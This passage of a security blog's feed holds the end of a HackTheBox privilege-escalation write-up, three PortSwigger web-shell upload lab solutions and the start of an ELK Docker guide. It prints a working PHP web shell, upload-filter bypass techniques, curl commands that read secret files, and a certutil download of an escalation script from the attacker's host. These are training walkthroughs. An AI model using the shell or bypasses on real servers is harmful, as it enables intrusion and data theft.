  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;evil-winrm -i 10.10.11.35 -u &amp;#39;emily.oscars&amp;#39; -p &amp;#39;Q!3@Lp#M6b*7t*Vt&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I found out that emily.oscars has a permission &lt;code&gt;SeBackupPrivilege&lt;/code&gt; which can be used to gain read access on any file on the system.&lt;/p&gt;
&lt;p&gt;here&amp;rsquo;s a script that allows just that: &lt;a href=&#34;https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1&#34;&gt;https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Then I got this script uploaded to emily&amp;rsquo;s workstation, which was hosted on my machine using python HTTP server.&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;certutil -urlcache -f http://10.10.14.167/privesc.ps1 privesc.ps1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Last step is to activate the script and read administrator folder.&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop&amp;gt; . ./privesc.ps1

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop&amp;gt; Acl-FullControl -user cicada\emily.oscars -path C:\users\administrator\desktop

*Evil-WinRM* PS C:\Users\Administrator\Desktop&amp;gt; cat root.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;user.txt - Acquired&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;root.txt - Acquired&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Cicada machine has been pwned.&lt;/p&gt;
</content>
    </item>
    <item>
      <title>1f4 - Web shell upload via extension blacklist bypass \[PortSwigger Lab]</title>
      <link>http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f4-web-shell-upload-via-extension-blacklist-bypass-portswigger-lab/</link>
      <pubDate>Tue, 16 Jul 2024 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f4-web-shell-upload-via-extension-blacklist-bypass-portswigger-lab/</guid>
      <description>&lt;p&gt;This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.&lt;/p&gt;
&lt;p&gt;To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file &lt;code&gt;/home/carlos/secret&lt;/code&gt;. Submit this secret.&lt;/p&gt;
&lt;p&gt;You can log in to your own account using the following credentials: &lt;code&gt;wiener:peter&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Solution:&lt;/p&gt;
&lt;p&gt;So once again User&amp;rsquo;s page has an avatar upload function which uploads an image at &lt;code&gt;/files/avatars&lt;/code&gt; directory.&lt;/p&gt;</description>
      <content>&lt;p&gt;This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.&lt;/p&gt;
&lt;p&gt;To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file &lt;code&gt;/home/carlos/secret&lt;/code&gt;. Submit this secret.&lt;/p&gt;
&lt;p&gt;You can log in to your own account using the following credentials: &lt;code&gt;wiener:peter&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Solution:&lt;/p&gt;
&lt;p&gt;So once again User&amp;rsquo;s page has an avatar upload function which uploads an image at &lt;code&gt;/files/avatars&lt;/code&gt; directory.&lt;/p&gt;
&lt;p&gt;Uploading &lt;code&gt;mal.php&lt;/code&gt; file gives out an error &lt;code&gt;Sorry, php files are not allowed Sorry, there was an error uploading your file.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This means that in the server configuration &lt;code&gt;php&lt;/code&gt; file extension uploads are blocked.&lt;/p&gt;
&lt;p&gt;trying to upload a &lt;code&gt;mal.php&lt;/code&gt; file shows in Burp Proxy HTTP History that we are talking to an Apache server.  Which means there&amp;rsquo;s a top-level &lt;code&gt;.htaccess&lt;/code&gt; and we can override it with directory-specific one.&lt;/p&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020240720184545.png&#34;   /&gt;
  &lt;/figure&gt;

&lt;p&gt;so what I did was uploaded an &lt;code&gt;.htaccess&lt;/code&gt; file to default location with following contents:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;AddType application/x-httpd-php .hack&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;where we are giving directory permission to execute &lt;code&gt;php&lt;/code&gt; files with an arbitrary extension &lt;code&gt;.hack&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Once uploaded we can call it using cURl and retrieve data.&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;curl -X GET &amp;#34;https://0ab9001703efe22d847cce3d003a000a.web-security-academy.net/files/avatars/mal.hack?command=cat%20/home/carlos/secret&amp;#34;

DTFL****************************DTFL****************************&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The secret: &lt;code&gt;DTFL****************************&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Bypassing blacklists is also possible using &lt;strong&gt;Obfuscating file extensions&lt;/strong&gt;. For example, if a filename is &lt;code&gt;executable.pHP&lt;/code&gt; and the validation code is case-sensitive, then it won&amp;rsquo;t recognize this as &lt;code&gt;php&lt;/code&gt; and let it bypass the defenses.&lt;/p&gt;
&lt;p&gt;Similar result can be achieved using the following techniques:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Provide multiple extensions. Depending on how validation happens, it could let in a file like &lt;code&gt;executable.php.jpg&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Add additional trailing character like &lt;code&gt;executable.php.&lt;/code&gt;. some algorithms just ignore or strip trailing characters&lt;/li&gt;
&lt;li&gt;Use URL encoding for filenames, dots, forward or backward characters. if the value is not checked during validation, the filename will be interpreted server-side.&lt;/li&gt;
&lt;li&gt;Add semicolons or URL-encoded null byte characters before the file extension. If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: &lt;code&gt;executable.php;.jpg&lt;/code&gt; or &lt;code&gt;executable.php%00.jpg&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like &lt;code&gt;xC0 x2E&lt;/code&gt;, &lt;code&gt;xC4 xAE&lt;/code&gt; or &lt;code&gt;xC0 xAE&lt;/code&gt; may be translated to &lt;code&gt;x2E&lt;/code&gt; if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Some defenses include stripping or replacing dangerous extensions to prevent it from executing. If this doesn&amp;rsquo;t happen recursively, you can place the prohibited extension such a way that after it is removed, valid extension will still be left in place. for example:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;exploit.p.**php**hp&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;striping &lt;code&gt;.php&lt;/code&gt; from this still leaves valid extension behind.&lt;/p&gt;
</content>
    </item>
    <item>
      <title>1f3 - Web shell upload via Path Traversal \[PortSwigger Lab]</title>
      <link>http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f3-web-shell-upload-via-path-traversal-portswigger-lab/</link>
      <pubDate>Tue, 09 Jul 2024 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f3-web-shell-upload-via-path-traversal-portswigger-lab/</guid>
      <description>&lt;p&gt;This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.&lt;/p&gt;
&lt;p&gt;To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file &lt;code&gt;/home/carlos/secret&lt;/code&gt;. Submit this secret.&lt;/p&gt;
&lt;p&gt;You can log in to your own account using the following credentials: &lt;code&gt;wiener:peter&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&#34;solution&#34;&gt;
  Solution:
  &lt;a href=&#34;#solution&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;So, User&amp;rsquo;s page includes avatar upload function. just to upload &lt;code&gt;mal.php&lt;/code&gt; with contents &lt;code&gt;&amp;lt;?php echo system($_GET[&#39;command&#39;]); ?&amp;gt;&lt;/code&gt; will just return plaintext version of this script.&lt;/p&gt;</description>
      <content>&lt;p&gt;This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.&lt;/p&gt;
&lt;p&gt;To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file &lt;code&gt;/home/carlos/secret&lt;/code&gt;. Submit this secret.&lt;/p&gt;
&lt;p&gt;You can log in to your own account using the following credentials: &lt;code&gt;wiener:peter&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&#34;solution&#34;&gt;
  Solution:
  &lt;a href=&#34;#solution&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;So, User&amp;rsquo;s page includes avatar upload function. just to upload &lt;code&gt;mal.php&lt;/code&gt; with contents &lt;code&gt;&amp;lt;?php echo system($_GET[&#39;command&#39;]); ?&amp;gt;&lt;/code&gt; will just return plaintext version of this script.&lt;/p&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020240720173537.png&#34;   /&gt;
  &lt;/figure&gt;

&lt;p&gt;it also seems that uploading &lt;code&gt;mal.php&lt;/code&gt; with path traversal &lt;code&gt;../mal.php&lt;/code&gt; still uploads it to &lt;code&gt;files/avatars/mal.php&lt;/code&gt;, which means that it&amp;rsquo;s cutting traversals in path.&lt;/p&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020240720173821.png&#34;   /&gt;
  &lt;/figure&gt;

&lt;p&gt;So all I had to do was obfuscating the path traversal to &lt;code&gt;..%2Fmal.php&lt;/code&gt; which is same as &lt;code&gt;../mal.php&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;after changing a filename to this parameter and uploading it we get the following response&lt;/p&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/uploaded.png&#34;   /&gt;
  &lt;/figure&gt;

&lt;p&gt;so the file is uploaded to &lt;code&gt;files/mal.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;now we can just call this script using [[1a1b - cURL|cURL]] to get the response&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;curl -X GET &amp;#34;https://0a3c00e4049c901c802ee994009d003a.web-security-academy.net/files/mal.php?command=cat%20/home/carlos/secret&amp;#34;


jziR****************************jziR****************************&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The secret: jziR****************************&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Another obvious way to prevent users from uploading certain files is to blacklist these file extensions like &lt;code&gt;php&lt;/code&gt;. This practice is still flawed since its difficult to explicitly blacklist every file that can be executed. such blacklists can be sometimes bypassed using lesser known, alternative file extensions like &lt;code&gt;.php5&lt;/code&gt; or &lt;code&gt;.shtml&lt;/code&gt; and so on.&lt;/p&gt;
&lt;p&gt;As previously mentioned, some servers won&amp;rsquo;t let certain files to execute unless they are explicitly configured to do that.&lt;/p&gt;
&lt;p&gt;As an example, before Apache server lets PHP files to execute, a developer might put something like the following in their &lt;code&gt;/etc/apache2/apache2.conf&lt;/code&gt; file:&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;LoadModule php_module /usr/lib/apache2/modules/libphp.so
	AddType application/x-httpd-php .php&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Many servers also allow developers to create special config-files within individual directories to override global configuration parameters. Apache-specific servers for example will load directory-specific configuration from a file called &lt;code&gt;.htaccess&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Similarly, directory-specific configuration can be made on IIS server using &lt;code&gt;web.config&lt;/code&gt; file. This might include directives such as the following, where server only allows JSON files to be served to users:&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;staticContent&amp;gt; 
	&amp;lt;mimeMap fileExtension=&amp;#34;.json&amp;#34; mimeType=&amp;#34;application/json&amp;#34; /&amp;gt; 
	&amp;lt;/staticContent&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Web servers use these kinds of configuration files when present, but you&amp;rsquo;re not normally allowed to access them using HTTP requests.&lt;/p&gt;
&lt;p&gt;However, you may occasionally find servers that fail to stop you from uploading your own malicious configuration file. In this case, even if the file extension you need is blacklisted, you may be able to trick the server into mapping an arbitrary, custom file extension to an executable type.&lt;/p&gt;
</content>
    </item>
    <item>
      <title>1f2 - Web shell upload via Content-Type restriction bypass \[Portswigger Lab]</title>
      <link>http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f2-web-shell-upload-via-content-type-restriction-bypass-portswigger-lab/</link>
      <pubDate>Sat, 06 Jul 2024 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f2-web-shell-upload-via-content-type-restriction-bypass-portswigger-lab/</guid>
      <description>&lt;p&gt;This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.&lt;/p&gt;
&lt;p&gt;To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file &lt;code&gt;/home/carlos/secret&lt;/code&gt;. Submit this secret.&lt;/p&gt;
&lt;p&gt;You can log in to your own account using the following credentials: &lt;code&gt;wiener:peter&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&#34;solution&#34;&gt;
  Solution:
  &lt;a href=&#34;#solution&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;So upon logging in my account, I can see the avatar upload field.&lt;/p&gt;</description>
      <content>&lt;p&gt;This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.&lt;/p&gt;
&lt;p&gt;To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file &lt;code&gt;/home/carlos/secret&lt;/code&gt;. Submit this secret.&lt;/p&gt;
&lt;p&gt;You can log in to your own account using the following credentials: &lt;code&gt;wiener:peter&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&#34;solution&#34;&gt;
  Solution:
  &lt;a href=&#34;#solution&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;So upon logging in my account, I can see the avatar upload field.&lt;/p&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020240719144326.png&#34;   /&gt;
  &lt;/figure&gt;

&lt;p&gt;Testing this functionality by uploading an empty &lt;code&gt;test.txt&lt;/code&gt; file gives me an error&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Sorry, file type text/plain is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The next thing I tried was to upload the same file but modify the HTTP request using burpsuite and change &lt;code&gt;Content-Type: Text/Plain&lt;/code&gt; to &lt;code&gt;Content-Type: image/jpeg&lt;/code&gt;. This bypassed a defense mechanism and as a result it let me upload a text file&lt;/p&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020240719145007.png&#34;   /&gt;
  &lt;/figure&gt;

&lt;p&gt;Now it&amp;rsquo;s time to upload a web shell &lt;code&gt;mal.php&lt;/code&gt; with the following contents:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;?php echo system($_GET[&#39;command&#39;]); ?&amp;gt;&lt;/code&gt;&lt;/p&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020240719145330.png&#34;   /&gt;
  &lt;/figure&gt;

&lt;p&gt;Now, since I know that this &lt;code&gt;mal.php&lt;/code&gt; is uploaded in &lt;code&gt;/files/avatars/mal.php&lt;/code&gt;, I can call it using CURL.&lt;/p&gt;
&lt;p&gt;And we got the secret&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;curl -X GET &amp;#34;https://0a2200b703596e51800635e70004004c.web-security-academy.net/files/avatars/mal.php?command=cat%20../../../../home/carlos/secret&amp;#34;

7nJBS****************************7nJBS****************************&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;remember that calls form curl like this repeats the response twice, so I had to remove the double of this output.&lt;/p&gt;
&lt;p&gt;The secret contents: &lt;code&gt;7nJB****************************&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Impact of FUVs generally depend on two key factors&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Which aspect of the file the website fails to validate properly, whether its the size, type, contents&amp;hellip;&lt;/li&gt;
&lt;li&gt;what restrictions are imposed once file is uploaded&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In the worst case scenario, the file is not validated at all and the server configuration allows certain types to run as code - potentially giving an attacker web shell and full access to a webserver.&lt;/p&gt;
&lt;p&gt;In case filename isn&amp;rsquo;t validated properly, an attacker might just replace original file with a malicious one.&lt;/p&gt;
&lt;p&gt;Failing to validate file size might also enable an attacker to perform a DoS.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;How Web servers handle static file requests?&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Generally, static files on a website can be mapped 1:1 with a filesystem hierarchy.&lt;/p&gt;
&lt;p&gt;Nowadays modern applications are dynamic and hence complex. Path of a request may not necessarily represent a filesystem entirely. Nowadays, web servers still deal with static requests for some static files like stylesheets, images etc.&lt;/p&gt;
&lt;p&gt;The process for handling such files is historically largely the same. - The server parses the path in the request to identify the file extension. Then uses this information to determine the filetype by comparing it to preconfigured mapping between extensions and MIME types.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;if the file is non-executable like HTML file, it may just send the file in the HTTP response&lt;/li&gt;
&lt;li&gt;if the file is executable like PHP or PYTHON and the server is configured to execute these files, it will assign variables based on the headers and parameters in the HTTP request before executing it. The result may be passed on to HTTP response after.&lt;/li&gt;
&lt;li&gt;if the file is executable, but the server is not configured to run them, it will generally respond with an error or in some cases, just send back the plain text representation of the code to the client. such misconfigurations may lead to code and sensitive data leakage. The &lt;code&gt;Content-Type&lt;/code&gt; response header may provide clues as to what kind of file the server thinks it has served.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;As a precaution, servers generally only run scripts whose filetypes have been explicitly defined to execute. Otherwise they may return an error message or plaintext of source code. In such cases, it might only be possible to leak the source but won&amp;rsquo;t be able to deploy a webshell.&lt;/p&gt;
&lt;p&gt;This kind of configuration will have a strict policy for directories where user can upload files than other locations on the filesystem that are assumed to be out of reach from users. If you can find a directory where user-uploaded files are not supposed to be, the code might execute.&lt;/p&gt;
&lt;p&gt;Web servers often use the &lt;code&gt;filename&lt;/code&gt; field in &lt;code&gt;multipart/form-data&lt;/code&gt; requests to determine the name and location where the file should be saved.&lt;/p&gt;
</content>
    </item>
    <item>
      <title>Configuring an ELK Stack Part 1</title>
      <link>http://localhost:1313/engineering/configuring-an-elk-stack-part-1/</link>
      <pubDate>Sun, 12 May 2024 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/engineering/configuring-an-elk-stack-part-1/</guid>
      <description>&lt;p&gt;In this article, I&amp;rsquo;ll be configuring ELK stack in docker. This will be 2 part series where first one will focus on configuring base ELK and second one more advanced stuff.&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;m following the official &lt;a href=&#34;https://www.elastic.co/blog/getting-started-with-the-elastic-stack-and-docker-compose&#34;&gt;Elastic guide&lt;/a&gt; on setting it up in docker using docker-compose.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s begin.&lt;/p&gt;

&lt;h3 id=&#34;file-structure&#34;&gt;
  File structure
  &lt;a href=&#34;#file-structure&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;First thing, I&amp;rsquo;m going to create initial file structure for docker, where Kibana, Metricbeat and Logstash will be able to use these files.&lt;/p&gt;</description>
      <content>&lt;p&gt;In this article, I&amp;rsquo;ll be configuring ELK stack in docker. This will be 2 part series where first one will focus on configuring base ELK and second one more advanced stuff.&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;m following the official &lt;a href=&#34;https://www.elastic.co/blog/getting-started-with-the-elastic-stack-and-docker-compose&#34;&gt;Elastic guide&lt;/a&gt; on setting it up in docker using docker-compose.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s begin.&lt;/p&gt;

&lt;h3 id=&#34;file-structure&#34;&gt;
  File structure
  &lt;a href=&#34;#file-structure&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;First thing, I&amp;rsquo;m going to create initial file structure for docker, where Kibana, Metricbeat and Logstash will be able to use these files.&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;bash&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;touch .env docker-compose.yml filebeat.yml logstash.conf metricbeat.yml&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;tree -la
.
 docker-compose.yml
 .env
 filebeat.yml
 logstash.conf
 metricbeat.yml

1 directory, 5 files&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id=&#34;configuration-files&#34;&gt;
  Configuration files
  &lt;a href=&#34;#configuration-files&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Next, I&amp;rsquo;m going to configure files that were just created&lt;/p&gt;

&lt;h4 id=&#34;env&#34;&gt;
  .env
  &lt;a href=&#34;#env&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;env&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-env&#34; data-lang=&#34;env&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Project name (if not set, select cwd)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#COMPOSE_PROJECT_NAME=elk-stack&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Password for the &amp;#39;elastic&amp;#39; user(min 6 characters)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ELASTIC_PASSWORD&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;elpass
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Password for the &amp;#39;kibana_system&amp;#39; user(min 6 characters)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;KIBANA_PASSWORD&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;kipass
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
